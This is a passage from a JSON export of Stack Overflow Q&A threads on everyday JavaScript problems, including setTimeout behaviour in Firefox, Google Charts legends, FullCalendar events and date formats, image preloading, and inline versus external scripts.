                    "body": "<p>In Firefox, the minimum value for setTimeout() calls <a href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Preferences/Mozilla_preferences_for_uber-geeks#DOM_preferences\" rel=\"nofollow\">is configurable</a> and defaults to 4 in current versions:</p>\n\n<blockquote>\n  <p><code>dom.min_timeout_value</code> The minimum length of time, in milliseconds,\n  that the window.setTimeout() function can set a timeout delay for.\n  This defaults to 4 ms (before 10 ms). Calls to setTimeout() with a\n  delay smaller than this will be clamped to this minimum value.</p>\n</blockquote>\n\n<p>Values like 0 or 1 should behave like 4\u2014no idea if that will cause delays in your code or just break it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have the following code which demonstrates the difference in calling a long-running function directly from an event trigger, vs using <code>setTimeout()</code>.</p>\n\n<p><strong>Intended behavior:</strong></p>\n\n<ul>\n<li><p>When first button is pressed, it appears pressed, the calculation runs for several seconds, then when the calculation finishes, the button appears depressed again and the second column changes from \"not calculating yet\" to \"calculation done\". (I won't elaborate on why that is supposed to happen, <a href=\"http://stackoverflow.com/a/4575011/119280\">it's explained in linked answer</a>). </p></li>\n<li><p>When second button is pressed, the button depresses immediately; the second column immediately changes to \"calculating...\" text. When the calculation finishes several seconds later, the second column changes from \"calculating...\" to \"calculation done\". </p></li>\n</ul>\n\n<p><strong>What actually happens:</strong></p>\n\n<ul>\n<li><p>This works perfectly in Chrome (both buttons behave as expected)</p></li>\n<li><p>This works perfectly in Internet Explorer 8</p></li>\n<li><p>This does NOT work in FireFox (v.25) as-is. Specifically, the second button behaves 100% as the first one.</p>\n\n<ul>\n<li><p>Changing the timeout in <code>setTimeout()</code> from <code>0</code> to <code>1</code> has no effect</p></li>\n<li><p>Changing the timeout in <code>setTimeout()</code> from <code>0</code> to <code>500</code> <strong>works</strong></p></li>\n</ul></li>\n</ul>\n\n<p>Which leaves me with a big conundrum. </p>\n\n<p>According to the whole reason behind why <code>setTimeout()</code> works whereas lack of one doesn't, the delay should have zero effect on how things work, <strong>since <code>setTimeout()</code>'s main purpose is to change the queuing order here, NOT to delay things</strong>.</p>\n\n<p>So, why is it not working with delay 0 or 1 on Firefox, but works as expected with delay 500 (and works with any delay on IE8/Chrome)?</p>\n\n<p>UPDATE: In addition to source code below, I also made a <a href=\"http://jsfiddle.net/C2YBE/30/\" rel=\"nofollow\">JSFiddle</a>. But for some reason JSFiddle refuses to even load on my IE8, so for that testing, the code below is required.</p>\n\n<p>UPDATE2: Someone raised the possibility of there being an issue with config setting <code>dom.min_timeout_value</code> in FF. I have edited it from 4 to 0, restarted the browser, and nothing was fixed. Still fails with timeout of 0 or 1 and succeeds with 500</p>\n\n<hr>\n\n<p>Here is my source code - I simply saved it to html file on C: drive and opened in all 3 browsers:</p>\n\n<pre><code>&lt;html&gt;&lt;body&gt;\n&lt;script src=\"http://code.jquery.com/jquery-1.9.1.js\"&gt;&lt;/script&gt;\n\n&lt;table border=1&gt;\n    &lt;tr&gt;&lt;td&gt;&lt;button id='do'&gt;Do long calc - bad status!&lt;/button&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;div id='status'&gt;Not Calculating yet.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td&gt;&lt;button id='do_ok'&gt;Do long calc - good status!&lt;/button&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;div id='status_ok'&gt;Not Calculating yet.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;\n\n&lt;script&gt;\nfunction long_running(status_div) {\n    var result = 0;\n    for (var i = 0; i &lt; 1000; i++) {\n        for (var j = 0; j &lt; 700; j++) {\n            for (var k = 0; k &lt; 200; k++) {\n                result = result + i + j + k;\n            }\n        }\n    }\n    $(status_div).text('calclation done');\n}\n\n// Assign events to buttons\n$('#do').on('click', function () {\n    $('#status').text('calculating....');\n    long_running('#status');\n});\n$('#do_ok').on('click', function () {\n    $('#status_ok').text('calculating....');\n    window.setTimeout(function (){ long_running('#status_ok') }, 0);\n});\n&lt;/script&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>To test, you will need to change the nested loop boundaries to 300/100/100 for IE8; or to 1000/1000/500 for Chrome, due to different sensitivity of \"this JS is taking too long\"  error coupled with JS engine speed.</p>\n",
            "last_activity_date": 1387821714,
            "question_id": 20747591,
            "score": 3,
            "tags": [
                "javascript",
                "html",
                "firefox",
                "cross-browser",
                "settimeout"
            ],
            "title": "Why doesn&#39;t this setTimeout based code work in FireFox with small timeout (works in IE/Chrome)?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Check this <a href=\"http://jsfiddle.net/k4J6Z/\">fiddle example</a>. It is your code with attached legend (idea from first comment, total calculation and some minor errors corrected).</p>\n\n<p>Basic idea is to set <code>legend</code> option of chart to <code>none</code> and than you have to build your own legend.</p>\n\n<p>If you load that code into browser the legend will be positioned to the right but you have to set proper CSS rules to get everything right (I'm not so familiar with CSS). But you have the basic idea how to do that.</p>\n\n<p>And for different sets of legend colors you can check <a href=\"https://github.com/mbostock/d3/blob/master/lib/colorbrewer/colorbrewer.js\">color brewer</a></p>\n",
                    "is_accepted": true,
                    "score": 5
                }
            ],
            "body": "<p>I have a page that displays data in a form of a Pie Chart. I use Google Charts to do this. Here's the code:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"https://www.google.com/jsapi\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n      google.load(\"visualization\", \"1\", {packages:[\"corechart\"]});\n      google.setOnLoadCallback(drawChart);\n      function drawChart() {\n        var data = google.visualization.arrayToDataTable([\n          ['Goal Name', 'No. of times Requested'],\n        ['Frank.net Life Cover', 226],\n        ['Frank.net Hospital Cash Back', 147],\n        ['Frank.net Salary Protection', 228],\n        ['King Price Car Insurance', 328],\n        ['Momentum Medical Aid', 493],\n        ['Oplan Health Cover', 185],\n        ['Youi Quote', 33],\n        ]);\n\n        var options = {\n          title: 'Most Requested Sponsors'\n        };\n\n       var chart = new google.visualization.PieChart(document.getElementById('piechart2'));\n        chart.draw(data, options);\n      }\n    &lt;/script&gt;\n&lt;div id=\"piechart2\" style=\"width: 700px; height: 400px; position: relative;\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>And here's a working JS FIDDLE:</p>\n\n<p><a href=\"http://jsfiddle.net/yRdW3/\" rel=\"nofollow\"><strong>http://jsfiddle.net/yRdW3/</strong></a></p>\n\n<p>Now, I need help on displaying the percentage and total next to each sponsor name on the legend. I have no idea how to achieve this. I want it to look similar to this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/nbSgO.jpg\" alt=\"enter image description here\"></p>\n",
            "last_activity_date": 1387297448,
            "question_id": 20089794,
            "score": 3,
            "tags": [
                "javascript",
                "google-visualization",
                "pie-chart"
            ],
            "title": "How to add Percentage and Total on the Legend of Google Pie Charts"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Take a look at the Event Dragging and Resizing <a href=\"http://arshaw.com/fullcalendar/docs/event_ui/\" rel=\"nofollow\">http://arshaw.com/fullcalendar/docs/event_ui/</a></p>\n\n<p>I think what you are looking for the <strong>eventDrop</strong> callback.</p>\n\n<blockquote>\n  <p>Triggered when dragging stops and the event has moved to a different\n  day/time.</p>\n</blockquote>\n\n<p><a href=\"http://arshaw.com/fullcalendar/docs/event_ui/eventDrop/\" rel=\"nofollow\">http://arshaw.com/fullcalendar/docs/event_ui/eventDrop/</a></p>\n\n<p>Example from arshaw's site:</p>\n\n<pre><code>$('#calendar').fullCalendar({\n    events: [\n        // events here\n    ],\n    editable: true,\n    eventDrop: function(event,dayDelta,minuteDelta,allDay,revertFunc) {\n\n        alert(\n            event.title + \" was moved \" +\n            dayDelta + \" days and \" +\n            minuteDelta + \" minutes.\"\n        );\n\n        if (allDay) {\n            alert(\"Event is now all-day\");\n        }else{\n            alert(\"Event has a time-of-day\");\n        }\n\n        if (!confirm(\"Are you sure about this change?\")) {\n            revertFunc();\n        }\n\n    }\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>I'm using <a href=\"http://arshaw.com/fullcalendar/\" rel=\"nofollow\">Fullcalendar</a> for a project I'm developing ... I have only one feature left to be implemented, which is when an existing event is dragged from it's original position to another time or date. I would like to know how I get the current object information (title, new start time, old start time, id, url, etc), so I can update the database with the newer information ... which property from the Fullcalendar object do I use?\nI implemented the <code>drop</code> property;</p>\n\n<pre><code>    drop  : function(date, allDay) {\n            // retrieve the dropped element's stored event object\n            var originalEventObject = $(this).data('eventObject');\n            // we need to copy it, so that multiple events don't \n            // have a reference object\n            var copiedEventObject   = $.extend({}, originalEventObject);\n            // assign it the date that was reported\n            copiedEventObject.start = date;\n            copiedEventObject.allDay = allDay;\n\n            // render the event on the calendar\n            // the last `true` argument determines if the event `sticks`\n            $('#calendar').fullCalendar('renderEvent', copiedEventObject, true);\n\n            // if the 'remove after drop' checkbox checked?\n            if ($('#drop-remove').is(':checked')) {\n                // if so remove the element from the \"Draggable Events\"\n                $(this).remove();\n            }\n    },\n</code></pre>\n\n<p>but it's not doing what I wanted ... </p>\n",
            "last_activity_date": 1382048544,
            "question_id": 19434303,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "fullcalendar"
            ],
            "title": "updating an event by dragging/dropping fullcalendar- Javascript"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>Try this.You have some symbols in <code>$imageUrl</code></p>\n\n<pre><code>&lt;img id=\"id1\" src=\"$imageUrl\" onload=\"javascript:showImage();\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>you can just append another hidden <code>img</code> element and swap them in <code>onload</code> event.</p>\n\n<p>Or use single image element and use javascript like:</p>\n\n<pre><code>var _img = document.getElementById('id1');\nvar newImg = new Image;\nnewImg.onload = function() {\n    _img.src = this.src;\n}\nnewImg.src = 'http://whatever';\n</code></pre>\n\n<p>this code should preload the image and show it when it's ready</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>Use a new image object each time you want to load a picture :</p>\n\n<pre><code>var image = new Image();\nimage.onload = function () {\n    document.getElementById('id1').setAttribute('src', this.src);\n};\nimage.src = 'http://path/to/image';\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can try this: </p>\n\n<pre><code>&lt;img id=\"id1\" src=\"url/to/file.png\" onload=\"showImage()\"&gt;\n\nfunction showImage() {\n $('#id1').attr('src', 'new/file/link.png');\n}\n</code></pre>\n\n<p>Also, try to remove the <code>~</code>, that is just the operator, that is needed for Server-Side (for example ASP.NET) you don't need it in JS.</p>\n\n<p>This way, you can change the attribute for the image.</p>\n\n<p>Here is the fiddle: <a href=\"http://jsfiddle.net/afzaal_ahmad_zeeshan/8H4MC/\" rel=\"nofollow\">http://jsfiddle.net/afzaal_ahmad_zeeshan/8H4MC/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you are loading the image via AJAX you could use a callback to check if the image is loaded and do the hiding and src attribute assigning. \nSomething like this: </p>\n\n<pre><code>$.ajax({ \n  url: [image source],\n  success: function() {\n  // Do the hiding here and the attribute setting\n  }\n});\n</code></pre>\n\n<p>For more reading refer to this <a href=\"http://api.jquery.com/jQuery.ajax/\" rel=\"nofollow\">JQuery AJAX</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>&lt;span&gt;\n    &lt;img id=\"my_image\" src=\"#\" /&gt;\n&lt;/span&gt;\n\n&lt;span class=\"spanloader\"&gt;\n\n    &lt;span&gt;set Loading Image Image&lt;/span&gt;\n\n\n&lt;/span&gt;\n\n&lt;input type=\"button\" id=\"btnnext\" value=\"Next\" /&gt;\n\n\n&lt;script type=\"text/javascript\"&gt;\n\n    $('#btnnext').click(function () {\n        $(\".spanloader\").hide();\n        $(\"#my_image\").attr(\"src\", \"1.jpg\");\n    });\n\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Sorry guys. </p>\n\n<p>You can't rely on the image load event to fire but you can kind of rely on it in some situations and fallback to a maximum load time allowed. In this case, 10 seconds. I wrote this and it lives on production code for when people want to link images on a form post.</p>\n\n<pre><code>function loadImg(options, callback) {\n  var seconds = 0,\n  maxSeconds = 10,\n  complete = false,\n  done = false;\n\n  if (options.maxSeconds) {\n    maxSeconds = options.maxSeconds;\n  }\n\n  function tryImage() {\n    if (done) { return; }\n    if (seconds &gt;= maxSeconds) {\n      callback({ err: 'timeout' });\n      done = true;\n      return;\n    }\n    if (complete &amp;&amp; img.complete) {\n      if (img.width &amp;&amp; img.height) {\n        callback({ img: img });\n        done = true;\n        return;\n      }\n      callback({ err: '404' });\n      done = true;\n      return;\n    } else if (img.complete) {\n      complete = true;\n    }\n    seconds++;\n    callback.tryImage = setTimeout(tryImage, 1000);\n  }\n  var img = new Image();\n  img.onload = tryImage();\n  img.src = options.src;\n  tryImage();\n}\n</code></pre>\n\n<p>use like so:</p>\n\n<pre><code>loadImage({ src : 'http://somewebsite.com/image.png', maxSeconds : 10 }, function(status) {\n  if(status.err) {\n    // handle error\n    return;\n  }\n  // you got the img within status.img\n}); \n</code></pre>\n\n<p>Try it on JSFiddle.net</p>\n\n<p><a href=\"http://jsfiddle.net/2Cgyg/6/\" rel=\"nofollow\">http://jsfiddle.net/2Cgyg/6/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>See this tutorial: <a href=\"https://www.nabisoft.com/tutorials/javascript/loading-images-with-native-javascript-and-handling-of-events-for-showing-loading-spinners\" rel=\"nofollow\">Loading images with native JavaScript and handling of events for showing loading spinners</a></p>\n\n<p>It tells you how to load images with native JavaScript and how to handle events for showing loading spinners. Basically, you create a new Image(); and handle the event correctly then. That should work in all browsers, even in IE7 (maybe even below IE7, but I did not test that...)</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>On my album slide show page, i have code like</p>\n\n<pre><code>&lt;span style=\"display:none;\"&gt;\n   &lt;img id=\"id1\" src=\"~$imageUrl`\" onload=\"javascript:showImage();\"&gt;\n&lt;/span&gt;\n\n&lt;span&gt;\n    // show loader.\n&lt;/span&gt;\n</code></pre>\n\n<p>in <code>showImage()</code>, i  am sure the image  is loaded, so i show the image and hide the loader.</p>\n\n<p>Now when user clicks on next, i need to change the src of the image. Now i need don't know how to set src only when image is loaded.</p>\n",
            "last_activity_date": 1425022298,
            "question_id": 19396390,
            "score": 3,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Load Image from javascript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Use another anonymous function as a wrapper to store a named function (callee shim) to your original function:</p>\n\n<pre><code>document.addEventListener('keyup', (function(e)\n  {\n  var aFunction = function()\n    {\n    var letter_entered = String.fromCharCode(e.keyCode).toLowerCase();\n    player.makeGuess(letter_entered);\n    };\n\n  if(player.win_status === true || player.lose_status === true) \n    {\n    document.removeEventListener('keyup', window, false);\n    }\n  else\n    {\n    aFunction();\n    }\n  }\n), false);\n</code></pre>\n\n<p><strong>References</strong></p>\n\n<ul>\n<li><p><a href=\"http://www.yuiblog.com/blog/2010/12/14/strict-mode-is-coming-to-town/\" rel=\"nofollow\">Strict Mode is Coming to Town</a></p></li>\n<li><p><a href=\"http://wiki.ecmascript.org/doku.php?id=es3.1:arguments.callee\" rel=\"nofollow\">ES3.1:arguments.callee</a></p></li>\n<li><p><a href=\"https://dnovatchev.wordpress.com/2012/10/15/recursion-with-anonymous-inline-functions-in-xpath-3-0-2/\" rel=\"nofollow\">Recursion with anonymous (inline) functions in XPath 3.0</a></p></li>\n<li><p><a href=\"https://dnovatchev.wordpress.com/2013/04/08/recursion-with-anonymous-inline-functions-in-xpath-3-0-part-ii/\" rel=\"nofollow\">Recursion with anonymous (inline) functions in XPath 3.0, Part II</a></p></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Use the following process:</p>\n\n<ul>\n<li>Create a variable</li>\n<li>Assign an anonymous function to the variable</li>\n<li>Invoke it with the variable reference</li>\n<li>The anonymous function references itself using the variable name</li>\n</ul>\n\n<p>Use it as such:</p>\n\n<pre><code>   var foo = function(e)\n    {\n    \"use strict\";\n    console.log(e);\n    document.removeEventListener('keyup', foo, false);\n    }\n\ndocument.addEventListener('keyup', foo);\n</code></pre>\n\n<p>You can solve this problem easily using the <code>y</code> combinator:</p>\n\n<pre><code>function y(f) {\n    return function () {\n        return f.bind(null, y(f)).apply(this, arguments);\n    };\n}\n</code></pre>\n\n<p>Now you can rewrite your code as follows:</p>\n\n<pre><code>document.addEventListener(\"keyup\", y(function (callee, e) {\n    player.makeGuess(String.fromCharCode(e.keyCode).toLowerCase());\n    if (player.win_status || player.lose_status) document\n        .removeEventListener(\"keyup\", callee);\n}));\n</code></pre>\n\n<p>That's all folks.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I have an <em>EventListener</em> that listens to the entire document and records keystrokes, but I want to remove this Listener when certain conditions are met. </p>\n\n<p>The following is a snippet of my code:</p>\n\n<pre><code>document.addEventListener('keyup', function(e) {\n    var letter_entered = String.fromCharCode(e.keyCode).toLowerCase();\n    player.makeGuess(letter_entered);\n\n    if(player.win_status === true || player.lose_status === true) {\n        document.removeEventListener('keyup', arguments.callee, false);\n    }\n});\n</code></pre>\n\n<p>This works, however according to the <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments/callee\" rel=\"nofollow\">Mozilla Developer Docs</a> this method has been deprecated. </p>\n\n<p>I'm aware that I can simply name the function, but <strong>is there an alternative that would allow me to continue using the unnamed function</strong>?</p>\n",
            "last_activity_date": 1422464837,
            "question_id": 19214977,
            "score": 3,
            "tags": [
                "javascript",
                "reflection",
                "arguments",
                "deprecated",
                "porting"
            ],
            "title": "Alternative to arguments.callee"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>You should read about unobtrusive javascript, \n<a href=\"http://en.wikipedia.org/wiki/Unobtrusive_JavaScript\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Unobtrusive_JavaScript</a>.</p>\n\n<p>There are other solutions for not loading all the javascript files in your assets directory for each webpage, one called requirejs that should check out, <a href=\"http://requirejs.org/\" rel=\"nofollow\">http://requirejs.org/</a> .</p>\n\n<p>Moreover as a general rule of thumb you should not be adding all your event listeners when page loads, what about dom objects that don't exist? It will throw up javascript errors and will break your code more than usual.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>It's not recommended to inline static resources <em>(in your case, the inline javascript)</em> since <strong>you can't cache them</strong>.</p>\n\n<p>Caching a static resource reduces the size of page loads \u2013\u00a0thus increasing the page load speed \u2013 for returning visitors. However it comes at the cost of an additional HTTP request <a href=\"https://developers.google.com/speed/docs/best-practices/request\">which should be avoided</a>.</p>\n\n<p>Whenever the static resource is <em>so small that the additional size is negligible in comparison to a HTTP request</em>, then it's actually recommended to keep that resource inline.</p>\n\n<p>It's usually a good idea to keep javascript libraries in external (cacheable) documents, while keeping small amounts of scripts inline.</p>\n\n<p><strong>So, in response to your headline</strong> \u2013 inline javascript isn't bad per-se. It's a balance whether or not it's worth a HTTP request to cache the resource.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<ul>\n<li><p>Avoiding inline js is not performance based...but its more about maintainability and separating the presentation layer(html) from the controller layer(js). </p></li>\n<li><p>Having inline js on different pages will make it difficult to maintain for you and others as the project scale increases.</p></li>\n<li><p>Moreover using separate js files you can encourage reusability and modular code design.</p></li>\n<li><p>keeps your html clean and you know where to look when any js error occurs instead of multiple templates.</p></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>It's possible that running unnecessary JavaScript on a page will cause that page to be slow to load. It depends on the JavaScript being run.</p>\n\n<p>You could test your example code by timing it, and seeing how long it takes for JavaScript to run <code>getElementsByClassName</code> repeatedly.</p>\n\n<p>(I'd bet it doesn't take very long at all, even if you've got 26 functions looking for elements with different class names, but with performance, always measure first.)</p>\n\n<p>If execution time is a problem, you could write your JavaScript so that it's mostly in one file, but expose functions that you run from inline JavaScript on the pages it's required on, instead of running it via <code>onload</code> events in your JavaScript file.</p>\n\n<p>It's worth remembering everything that has to happen when a page is loaded though:</p>\n\n<ol>\n<li>The browser fetches the page from its cache, or sends an HTTP request to see if the page has changed since it was cached, and/or sends an HTTP request for the page itself.</li>\n<li>The browser parses and renders the page, pausing to fetch and run any external JavaScript, and fetching stylesheets and images concurrently with parsing and rendering.</li>\n<li>The browser runs any JavaScript set to run on document ready.</li>\n<li>The browser runs any JavaScript set to run on page load.</li>\n</ol>\n\n<p>Although you certainly can write JavaScript that runs slowly, it's likely that it's better overall to have your JavaScript in an external file, and therefore in the user's browser's cache, rather than having it increasing page size by being inline. Network, in general, tends to be much slower than JavaScript parsing/execution.</p>\n\n<p>But, and I'm saying this again because it's the most important point, this will all be different depending on your code. If you want to keep your performance good, your first and last act must be to measure it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>there are variuos case that needs to be keep in mind while placing js code.</p>\n\n<p>For inline :</p>\n\n<ol>\n<li><p>there is no need to navigate to an external file if you need to change something quickly, so its better in locality</p></li>\n<li><p>if you are using AJAX in some elements of your page you <strong>may</strong> loose all the dom element onclick etc for that section, that obviously depends on how you binded them. for ex you can use live or delegate in case your using jQuery to avoid above said problem... but i find that if js is small enough it is preferable to just put it inline.</p></li>\n</ol>\n\n<p>Now there other theory for ex </p>\n\n<p>Externalizing javascript is one of the yahoo performance rules:</p>\n\n<p><a href=\"http://developer.yahoo.com/performance/rules.html#external\" rel=\"nofollow\">http://developer.yahoo.com/performance/rules.html#external</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Making js inline to all pages make the application heavy so we should go with external js which includes to require pages that will help us to utilization of js code to each functionality.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>It is always recommended to avoid inline Javascript codes by putting all codes in a <code>JS</code> file, which is included in all pages. I wonder, if this does not cause performance problem in heavy pages.</p>\n\n<p>For example, imagine that we have tens of functions like this</p>\n\n<pre><code>function function1(element){\nvar el=document.getElementsByClassName(element);\nvar size=el.length;\nif(size==0) return;\nfor(i=0;i&lt;size;i++){\n// the process\n}\n}\n</code></pre>\n\n<p>on every page, we need to run the functions to know if there are corresponding elements in the HTML or not.</p>\n\n<pre><code>window.onload = function(){\nfunction1('a');\n....\nfunction26('z');\n};\n</code></pre>\n\n<p>but if keeping all functions in an external <code>JS</code> file, and calling functions through inline <code>JavaScript</code>, we can call only the functions, which are required in the present page:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\nwindow.onload = function(){\nfunction6('f');\n};\n&lt;/script&gt;\n</code></pre>\n\n<p><em><strong>Doesn't it beneficial from performance point of view to call functions via inline <code>Javascript</code> (which is of course not best practice) to avoid call of lots of functions, which are not needed in a page?</em></strong></p>\n\n<p>Of course, this is not limited to functions only, as we have lots of <code>addEventListener</code>s for the entire website, which are fired on each and every page, where they are not needed.</p>\n",
            "last_activity_date": 1401783900,
            "question_id": 19002690,
            "score": 3,
            "tags": [
                "javascript",
                "performance",
                "javascript-events",
                "unobtrusive-javascript"
            ],
            "title": "Why inline JavaScript is bad?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I believe most browsers refuse to execute <code>javascript:</code> URLs from the URL bar as a safety measure (there's been messages on the web \u2013esp. Facebook\u2013 telling people to copy-paste a <code>javascript:</code> URL to their URL bar that triggered an XSS). They didn't want to break bookmarklets though, so you can put that code in a bookmark; but it's much easier to just open the browser's JS console and type that command there.</p>\n\n<p>Anyway, it's not due to GWT's DevMode.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>You can write your javascript code inside the block like this </p>\n\n<pre><code>javascript:{alert(\"ok\");}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm trying to execute Javascript on my web application by executing this on the browser URL/address bar:</p>\n\n<pre><code>javascript:window.alert('test');void(0);\n</code></pre>\n\n<p>However, nothing happens and the alert box is not showing up? Could the reason be that the app is running in DevMode?</p>\n",
            "last_activity_date": 1414621271,
            "question_id": 18782297,
            "score": 3,
            "tags": [
                "java",
                "javascript",
                "gwt"
            ],
            "title": "Execute Javascript method from browser address bar - GWT"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>For information specific to the FullCalendar, you probably need to see <a href=\"http://arshaw.com/fullcalendar/docs/utilities/formatDate/\" rel=\"nofollow\">this</a>, which gives you some formating rules. There's some more information <a href=\"http://arshaw.com/fullcalendar/docs/text/titleFormat/\" rel=\"nofollow\">here</a> that might be useful.</p>\n\n<hr>\n\n<p>Yet, you can do so with JavaScript directly if you need this date format in an interface between the FullCalendar and other package or your own code:</p>\n\n<p>If you want \"today\", you can (be careful since that'll be client-side):</p>\n\n<pre><code>&gt; (new Date()).toISOString().slice(0, 10)\n'2013-08-31'\n</code></pre>\n\n<p>And from the string you said, you can:</p>\n\n<pre><code>&gt; dateStr = \"Tue Aug 13 2013 18:00:00 GMT-0400 (EDT)\"\n&gt; (new Date(dateStr)).toISOString().slice(0, 10)\n'2013-08-13'\n</code></pre>\n\n<p>Both would give you the ISO date in UTC. For locale date, you should \"move\" your time object to UTC before using <code>.toISOString</code>. Let:</p>\n\n<pre><code>&gt; dateStr = \"Mon Aug 12 2013 22:00:00 GMT-0400 (EDT)\"\n&gt; dateObj = new Date(dateStr) /* Or empty, for today */\n&gt; dateIntNTZ = dateObj.getTime() - dateObj.getTimezoneOffset() * 60 * 1000\n&gt; dateObjNTZ = new Date(dateIntNTZ)\n&gt; dateObjNTZ.toISOString().slice(0, 10)\n'2013-08-12'\n</code></pre>\n\n<p>Locale can still be different from GMT-0400 given in your example (here it's GMT-0300, at the end it gives me 1 hour after the one in this example).</p>\n\n<hr>\n\n<p>I'll replicate here the information from the first FullCalendar link I said:</p>\n\n<h1>formatDate</h1>\n\n<p>Formats a Date object into a string.</p>\n\n<pre><code>$.fullCalendar.formatDate( date, formatString [, options ] ) -&gt; String\n</code></pre>\n\n<p>Prior to version 1.3, formatDate accepted a very different format. See <a href=\"http://arshaw.com/fullcalendar/docs/utilities/formatDate_pre_13/\" rel=\"nofollow\">here</a>.</p>\n\n<p><code>formatString</code> is a combination of any of the following commands:</p>\n\n<ul>\n<li><strong>s</strong> - seconds</li>\n<li><strong>ss</strong> - seconds, 2 digits</li>\n<li><strong>m</strong> - minutes</li>\n<li><strong>mm</strong> - minutes, 2 digits</li>\n<li><strong>h</strong> - hours, 12-hour format</li>\n<li><strong>hh</strong> - hours, 12-hour format, 2 digits</li>\n<li><strong>H</strong> - hours, 24-hour format</li>\n<li><strong>HH</strong> - hours, 24-hour format, 2 digits</li>\n<li><strong>d</strong> - date number</li>\n<li><strong>dd</strong> - date number, 2 digits</li>\n<li><strong>ddd</strong> - date name, short</li>\n<li><strong>dddd</strong> - date name, full</li>\n<li><strong>M</strong> - month number</li>\n<li><strong>MM</strong> - month number, 2 digits</li>\n<li><strong>MMM</strong> - month name, short</li>\n<li><strong>MMMM</strong> - month name, full</li>\n<li><strong>yy</strong> - year, 2 digits</li>\n<li><strong>yyyy</strong> - year, 4 digits</li>\n<li><strong>t</strong> - 'a' or 'p'</li>\n<li><strong>tt</strong> - 'am' or 'pm'</li>\n<li><strong>T</strong> - 'A' or 'P'</li>\n<li><strong>TT</strong> - 'AM' or 'PM'</li>\n<li><strong>u</strong> - ISO8601 format</li>\n<li><strong>S</strong> - 'st', 'nd', 'rd', 'th' for the date</li>\n<li><strong>W</strong> - the <a href=\"http://en.wikipedia.org/wiki/ISO_8601#Week_dates\" rel=\"nofollow\">ISO8601 week number</a></li>\n</ul>\n\n<p>Special Characters:</p>\n\n<p><code>'...'</code>\n    literal text</p>\n\n<p><code>''</code>\n    single quote (represented by two single quotes)</p>\n\n<p><code>(...)</code>\n    only displays format if one of the enclosed variables is non-zero</p>\n\n<p>The <code>options</code> parameter can be used to override default locale options, such as <a href=\"http://arshaw.com/fullcalendar/docs/text/monthNames/\" rel=\"nofollow\">monthNames</a>, <a href=\"http://arshaw.com/fullcalendar/docs/text/monthNamesShort/\" rel=\"nofollow\">monthNamesShort</a>, <a href=\"http://arshaw.com/fullcalendar/docs/text/dayNames/\" rel=\"nofollow\">dayNames</a>, and <a href=\"http://arshaw.com/fullcalendar/docs/text/dayNamesShort/\" rel=\"nofollow\">dayNamesShort</a>.</p>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>Want to find the way to change the default date format in FullCalendar.</p>\n\n<p><strong>Actually, it is:</strong><br>\nTue Aug 13 2013 18:00:00 GMT-0400 (EDT)</p>\n\n<p><strong>I want:</strong><br>\n2013-08-13</p>\n\n<p>Thanks.</p>\n",
            "last_activity_date": 1389746231,
            "question_id": 18551331,
            "score": 3,
            "tags": [
                "javascript",
                "fullcalendar"
            ],
            "title": "FullCalendar date format"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Your function will (in effect) return <code>undefined</code> implicitly after it reaches <code>alert('Error . ' + e);</code>, because execution will reach the end of the function without an explicit <code>return</code>.</p>\n\n<p>So probably making sure that all code paths through the function return a value explicitly will get rid of the IntelliJ error.</p>\n",
                    "is_accepted": true,
                    "score": 10
                }
            ],
